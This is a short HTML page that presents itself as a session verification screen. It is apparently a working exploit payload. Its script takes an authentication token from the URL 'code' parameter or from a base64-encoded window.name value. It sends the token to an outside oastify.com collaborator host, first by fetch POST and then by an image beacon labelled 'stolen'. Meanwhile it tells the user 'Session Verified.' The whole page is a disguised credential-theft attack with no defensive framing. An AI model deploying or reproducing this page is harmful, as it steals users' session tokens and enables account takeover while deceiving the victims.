<!DOCTYPE html>
<html>
<head><title>Verify</title></head>
<body>
    <div id="status">Verifying Session...</div>
    <script>
        (function() {
            const status = document.getElementById('status');
            const collab = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";

            function exfiltrate(token, src) {
                status.textContent = "Session Verified.";
                // Method 1: Fetch
                fetch(collab + "?method=" + src, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: token
                });
                // Method 2: Image beacon (Backup)
                new Image().src = collab + "?stolen=" + encodeURIComponent(token) + "&src=" + src;
            }

            // 1. Grab from URL 'code' param (This is what appeared in your logs)
            const params = new URLSearchParams(window.location.search);
            const urlToken = params.get('code');
            if (urlToken) {
                exfiltrate(urlToken, "url_param");
                return;
            }

            // 2. Fallback to window.name (Standard method)
            if (window.name) {
                try {
                    const data = JSON.parse(atob(window.name));
                    const winToken = data.props.context.environment.authToken;
                    if (winToken) exfiltrate(winToken, "window_name");
                } catch(e) {}
            }
        })();
    </script>
</body>
</html>
